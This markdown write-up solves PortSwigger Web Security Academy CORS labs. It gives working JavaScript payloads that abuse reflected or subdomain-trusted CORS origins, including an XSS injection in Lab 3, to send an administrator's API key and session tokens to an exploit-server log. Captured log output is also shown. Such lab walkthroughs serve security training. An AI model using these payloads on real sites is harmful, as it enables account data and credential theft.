# Cross-origin resource sharing (CORS)

Get details at [here](https://portswigger.net/web-security/cors)

---

[Lab 1](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

Description of this lab: craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key and use credentials: wiener:peter

Log in with above credentials, then we can find in `/accountDetails` having response contains the Access-Control-Allow-Credentials header, we need to exploit this.

Use this script in exploit server body, click store and view exploit to check everything is ok, then deliver exploit to victim and go to access log to find response

```js
    <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ad300b20384a448c0c2754200cb00ab.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
    </script>
```

We can find a request like this `GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22ppangVtseLowbvHNDQTQGwasciL3jlOz%22,%20%20%22sessions%22:%20[%20%20%20%20%22qJ0YDt5Fc25rXs625eXPcWIU5RTujr4r%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.71 Safari/537.36"` and answer is ppangVtseLowbvHNDQTQGwasciL3jlOz (after apikey). Go back home and submit, then solved the lab.

[Lab 2](#)

[Lab 3](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

Description of this lab: it trusts all subdomains regardless of the protocol, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key

Log in with credentials lab 1, 

At any post having check stock button, when we click on this, website will pop up new screen with URL like this `http://stock.0a5d009103eed0bfc040312500d40071.web-security-academy.net/?productId=1&storeId=1`. Resending this with burp repeater, and it has Access-Control-Allow-Credentials header

Use this script in exploit server:

```js
    <script>
        document.location="http://stock.0a5d009103eed0bfc040312500d40071.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a5d009103eed0bfc040312500d40071.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0aa400b1033fd0f0c0c83346012000f0.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>
```

Do the same as lab 1,and we get log like this `"GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%222xBdobabBVdlG3LL1JSSZBDYGYpzettT%22,%20%20%22sessions%22:%20[%20%20%20%20%22F6zL5lbcOG04rrzPnWPzXkB7bp2omm2O%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.71 Safari/537.36"`. Submit secret and solved the lab.